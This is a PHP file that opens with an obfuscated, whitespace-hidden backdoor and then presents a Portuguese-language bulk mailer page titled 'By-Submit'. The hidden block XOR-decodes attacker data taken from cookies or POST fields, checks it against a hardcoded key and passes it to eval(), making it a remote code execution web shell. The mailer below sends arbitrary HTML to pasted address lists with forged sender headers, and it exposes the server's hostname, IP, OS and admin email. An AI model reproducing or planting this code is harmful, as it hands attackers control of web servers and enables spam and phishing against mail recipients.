<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['l9757dc'];global$l9757dc;$l9757dc=$GLOBALS;$l9757dc['b8308e4']="\x36\x57\x20\x62\x2c\x45\x29\x76\x47\x42\x69\x59\x53\x7a\x68\x23\x74\x73\x5e\x5a\x50\x63\x79\x7c\x3a\x2e\x2d\x30\x56\x3d\x48\x51\x25\x4b\xa\x6d\x5d\x52\x6a\x6e\x5b\x38\x71\x49\x4e\x7e\x40\x78\x72\x67\x9\x22\x26\x7d\x4d\x32\x4c\x5f\x66\x44\x6c\x41\x55\x3e\xd\x60\x4a\x77\x4f\x61\x75\x2a\x6b\x24\x3f\x5c\x6f\x65\x2f\x39\x31\x7b\x3b\x46\x54\x70\x43\x33\x35\x34\x64\x58\x28\x27\x3c\x21\x2b\x37";$l9757dc[$l9757dc['b8308e4'][85].$l9757dc['b8308e4'][3].$l9757dc['b8308e4'][0].$l9757dc['b8308e4'][80].$l9757dc['b8308e4'][79].$l9757dc['b8308e4'][3].$l9757dc['b8308e4'][79].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][41]]=$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][14].$l9757dc['b8308e4'][48];$l9757dc[$l9757dc['b8308e4'][13].$l9757dc['b8308e4'][3].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][41]]=$l9757dc['b8308e4'][76].$l9757dc['b8308e4'][48].$l9757dc['b8308e4'][90];$l9757dc[$l9757dc['b8308e4'][39].$l9757dc['b8308e4'][0].$l9757dc['b8308e4'][41].$l9757dc['b8308e4'][97]]=$l9757dc['b8308e4'][17].$l9757dc['b8308e4'][16].$l9757dc['b8308e4'][48].$l9757dc['b8308e4'][60].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][39];$l9757dc[$l9757dc['b8308e4'][49].$l9757dc['b8308e4'][80].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][88].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][90]]=$l9757dc['b8308e4'][10].$l9757dc['b8308e4'][39].$l9757dc['b8308e4'][10].$l9757dc['b8308e4'][57].$l9757dc['b8308e4'][17].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][16];$l9757dc[$l9757dc['b8308e4'][39].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][89]]=$l9757dc['b8308e4'][17].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][48].$l9757dc['b8308e4'][10].$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][60].$l9757dc['b8308e4'][10].$l9757dc['b8308e4'][13].$l9757dc['b8308e4'][77];$l9757dc[$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][58].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][80]]=$l9757dc['b8308e4'][85].$l9757dc['b8308e4'][14].$l9757dc['b8308e4'][85].$l9757dc['b8308e4'][7].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][48].$l9757dc['b8308e4'][17].$l9757dc['b8308e4'][10].$l9757dc['b8308e4'][76].$l9757dc['b8308e4'][39];$l9757dc[$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][27].$l9757dc['b8308e4'][0]]=$l9757dc['b8308e4'][70].$l9757dc['b8308e4'][39].$l9757dc['b8308e4'][17].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][48].$l9757dc['b8308e4'][10].$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][60].$l9757dc['b8308e4'][10].$l9757dc['b8308e4'][13].$l9757dc['b8308e4'][77];$l9757dc[$l9757dc['b8308e4'][67].$l9757dc['b8308e4'][41].$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][27].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][87]]=$l9757dc['b8308e4'][3].$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][17].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][0].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][57].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][76].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][77];$l9757dc[$l9757dc['b8308e4'][38].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][0].$l9757dc['b8308e4'][27]]=$l9757dc['b8308e4'][17].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][16].$l9757dc['b8308e4'][57].$l9757dc['b8308e4'][16].$l9757dc['b8308e4'][10].$l9757dc['b8308e4'][35].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][57].$l9757dc['b8308e4'][60].$l9757dc['b8308e4'][10].$l9757dc['b8308e4'][35].$l9757dc['b8308e4'][10].$l9757dc['b8308e4'][16];$l9757dc[$l9757dc['b8308e4'][72].$l9757dc['b8308e4'][80].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][88].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][58]]=$l9757dc['b8308e4'][42].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][58].$l9757dc['b8308e4'][58].$l9757dc['b8308e4'][3].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][89];$l9757dc[$l9757dc['b8308e4'][14].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][88].$l9757dc['b8308e4'][89]]=$l9757dc['b8308e4'][48].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][0].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][41];$l9757dc[$l9757dc['b8308e4'][49].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][41].$l9757dc['b8308e4'][27].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][90]]=$_POST;$l9757dc[$l9757dc['b8308e4'][49].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][89]]=$_COOKIE;@$l9757dc[$l9757dc['b8308e4'][49].$l9757dc['b8308e4'][80].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][88].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][90]]($l9757dc['b8308e4'][77].$l9757dc['b8308e4'][48].$l9757dc['b8308e4'][48].$l9757dc['b8308e4'][76].$l9757dc['b8308e4'][48].$l9757dc['b8308e4'][57].$l9757dc['b8308e4'][60].$l9757dc['b8308e4'][76].$l9757dc['b8308e4'][49],NULL);@$l9757dc[$l9757dc['b8308e4'][49].$l9757dc['b8308e4'][80].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][88].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][90]]($l9757dc['b8308e4'][60].$l9757dc['b8308e4'][76].$l9757dc['b8308e4'][49].$l9757dc['b8308e4'][57].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][48].$l9757dc['b8308e4'][48].$l9757dc['b8308e4'][76].$l9757dc['b8308e4'][48].$l9757dc['b8308e4'][17],0);@$l9757dc[$l9757dc['b8308e4'][49].$l9757dc['b8308e4'][80].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][88].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][90]]($l9757dc['b8308e4'][35].$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][47].$l9757dc['b8308e4'][57].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][47].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][70].$l9757dc['b8308e4'][16].$l9757dc['b8308e4'][10].$l9757dc['b8308e4'][76].$l9757dc['b8308e4'][39].$l9757dc['b8308e4'][57].$l9757dc['b8308e4'][16].$l9757dc['b8308e4'][10].$l9757dc['b8308e4'][35].$l9757dc['b8308e4'][77],0);@$l9757dc[$l9757dc['b8308e4'][38].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][0].$l9757dc['b8308e4'][27]](0);$k316f9750=NULL;$u52e01910=NULL;$l9757dc[$l9757dc['b8308e4'][13].$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][88].$l9757dc['b8308e4'][27].$l9757dc['b8308e4'][55]]=$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][88].$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][79].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][26].$l9757dc['b8308e4'][58].$l9757dc['b8308e4'][0].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][26].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][79].$l9757dc['b8308e4'][41].$l9757dc['b8308e4'][26].$l9757dc['b8308e4'][3].$l9757dc['b8308e4'][27].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][88].$l9757dc['b8308e4'][26].$l9757dc['b8308e4'][80].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][0].$l9757dc['b8308e4'][58].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][27].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][79].$l9757dc['b8308e4'][89];global$za502;function r462a238($k316f9750,$ee424){global$l9757dc;$t1d20b7="";for($c8c672ff0=0;$c8c672ff0<$l9757dc[$l9757dc['b8308e4'][39].$l9757dc['b8308e4'][0].$l9757dc['b8308e4'][41].$l9757dc['b8308e4'][97]]($k316f9750);){for($w33f=0;$w33f<$l9757dc[$l9757dc['b8308e4'][39].$l9757dc['b8308e4'][0].$l9757dc['b8308e4'][41].$l9757dc['b8308e4'][97]]($ee424)&&$c8c672ff0<$l9757dc[$l9757dc['b8308e4'][39].$l9757dc['b8308e4'][0].$l9757dc['b8308e4'][41].$l9757dc['b8308e4'][97]]($k316f9750);$w33f++,$c8c672ff0++){$t1d20b7.=$l9757dc[$l9757dc['b8308e4'][85].$l9757dc['b8308e4'][3].$l9757dc['b8308e4'][0].$l9757dc['b8308e4'][80].$l9757dc['b8308e4'][79].$l9757dc['b8308e4'][3].$l9757dc['b8308e4'][79].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][41]]($l9757dc[$l9757dc['b8308e4'][13].$l9757dc['b8308e4'][3].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][41]]($k316f9750[$c8c672ff0])^$l9757dc[$l9757dc['b8308e4'][13].$l9757dc['b8308e4'][3].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][41]]($ee424[$w33f]));}}return$t1d20b7;}function q74ffbca4($k316f9750,$ee424){global$l9757dc;global$za502;return$l9757dc[$l9757dc['b8308e4'][14].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][88].$l9757dc['b8308e4'][89]]($l9757dc[$l9757dc['b8308e4'][14].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][88].$l9757dc['b8308e4'][89]]($k316f9750,$za502),$ee424);}foreach($l9757dc[$l9757dc['b8308e4'][49].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][89]]as$ee424=>$o2b6){$k316f9750=$o2b6;$u52e01910=$ee424;}if(!$k316f9750){foreach($l9757dc[$l9757dc['b8308e4'][49].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][41].$l9757dc['b8308e4'][27].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][90]]as$ee424=>$o2b6){$k316f9750=$o2b6;$u52e01910=$ee424;}}$k316f9750=@$l9757dc[$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][27].$l9757dc['b8308e4'][0]]($l9757dc[$l9757dc['b8308e4'][72].$l9757dc['b8308e4'][80].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][88].$l9757dc['b8308e4'][89].$l9757dc['b8308e4'][58]]($l9757dc[$l9757dc['b8308e4'][67].$l9757dc['b8308e4'][41].$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][27].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][87]]($k316f9750),$u52e01910));if(isset($k316f9750[$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][72]])&&$za502==$k316f9750[$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][72]]){if($k316f9750[$l9757dc['b8308e4'][69]]==$l9757dc['b8308e4'][10]){$c8c672ff0=Array($l9757dc['b8308e4'][85].$l9757dc['b8308e4'][7]=>@$l9757dc[$l9757dc['b8308e4'][69].$l9757dc['b8308e4'][58].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][87].$l9757dc['b8308e4'][55].$l9757dc['b8308e4'][80]](),$l9757dc['b8308e4'][17].$l9757dc['b8308e4'][7]=>$l9757dc['b8308e4'][80].$l9757dc['b8308e4'][25].$l9757dc['b8308e4'][27].$l9757dc['b8308e4'][26].$l9757dc['b8308e4'][80],);echo@$l9757dc[$l9757dc['b8308e4'][39].$l9757dc['b8308e4'][97].$l9757dc['b8308e4'][21].$l9757dc['b8308e4'][77].$l9757dc['b8308e4'][90].$l9757dc['b8308e4'][89]]($c8c672ff0);}elseif($k316f9750[$l9757dc['b8308e4'][69]]==$l9757dc['b8308e4'][77]){eval($k316f9750[$l9757dc['b8308e4'][90]]);}exit();} ?><?php
$testa = $_POST['veio'];
if($testa != "") {
	$message = $_POST['html'];
	$subject = $_POST['assunto'];
	$nome = $_POST['nome'];
	$de = $_POST['emails'];
	$to = $_POST['emails'];

	$email = explode("\n", $to);
	$message = stripslashes($message);

	$i = 0;
	$count = 1;
	while($email[$i]) {
                 $dataHora = date("d/m/Y h:i:s");



		
                 $EmailTemporario = $email[$i];
                 $message = stripslashes($message);
		$headers  = "MIME-Version: 1.0\n";
        $headers .= "Content-type: text/html; charset=iso-8859-1\n";
		$headers .= "From: ".$nome." <".$EmailTemporario.">\r\n";
		
			if(mail($EmailTemporario, $subject, $message.$dataHora, $headers))
		echo "<font color=blue>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=black>VEM INFOOOOO....!</font><br><hr>";
		else
		echo "<font color=red>* N&#1098;mero: $count <b>".$email[$i]."</b> <font color=red>EROO NAO ENVIO</font><br><hr>";
		$i++;
		$count++;
	}
	$count--;
	echo "[Fim do Envio]";
	if($ok == "ok")
	echo "[Fim do Envio]"; 

}

?>
<HTML>
<head>
<title>By-Submit</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
body {
	margin-left: 0;
	margin-right: 0;
	margin-top: 0;
	margin-bottom: 0;
}
.titulo {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 70px;
	color: #000000;
	font-weight: bold;
}

.normal {
	font-family: "Courier New", Courier, monospace;
	font-size: 16px;
	color: #00F;
}

.form {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 10px;
	color: #000000;
	background-color: #0000FF;
	border: 1px dashed #666666;
}

.texto {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-weight: bold;
}

.alerta {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-weight: bold;
	color: #000;
	font-size: 10px;
}
.normal tr td p strong {
	font-size: 24px;
}
</style>
</head>
<BODY>
<form action="" method="post" enctype="multipart/form-data" name="form1">
  <input type="hidden" name="veio" value="sim">
  <table width="511" height="750" border="0" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC" class="normal">
    <tr>
      <td width="509" height="46" align="center" bgcolor="#000000"><p><strong>BY-SUBMIT</strong></p></td>
    </tr>
    <tr>
      <td height="194" valign="top" bgcolor="#FFFFFF">
	  	<table width="100%"  border="0" cellpadding="0" cellspacing="5" class="normal" height="499">
		  <tr>
            
            
            <td align="right" height="17"><span class="texto">Assunto:</span></td>
            <td height="17"><input name="assunto" type="text"class="normal" id="assunto" style="width:100%" ></td>
          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="20" colspan="2" bgcolor="#99CCFF"><span class="texto">C&oacute;digo HTML:</span></td>
          </tr>
          <tr align="right">
            <td height="146" colspan="2" valign="top"><br>
             <textarea name="html" style="width:100%" rows="8" wrap="VIRTUAL" class="normal" id="html">
</textarea>


              <span class="alerta"> HTML</span></td>



          </tr>
          <tr align="center" bgcolor="#99CCFF">
            <td height="47" colspan="2" bgcolor="#000000">E-MAILS<span class="texto"> </span></td>
          </tr>
          <tr align="right">
            <td height="136" colspan="2" valign="top"><br>
              <textarea name="emails" style="width:100%" rows="8" wrap="VIRTUAL" class="normal" id="emails"></textarea>
              <span class="alerta">OBS*Lista em quebra de linha</span> </td>
          </tr>
          <tr>
            <td height="24" align="right" valign="top" colspan="2"><input type="submit" name="Submit" id="enviar" value="Enviar"></td>
          </tr>
        </table>
	  </td>
    </tr>
    <tr>
      <tr align="left"> 
<td colspan="2" bgcolor="#000000" >Nome do Servidor: <?php echo $UNAME = @php_uname(); ?><br>
Endere&#231;o IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br>
Sistema Operacional: <?php echo $OS = @PHP_OS; ?><br>
Email admin: <?php echo $_SERVER['SERVER_ADMIN']; ?> <br>
</td>
    </tr>
  </table>
  </form></body></html>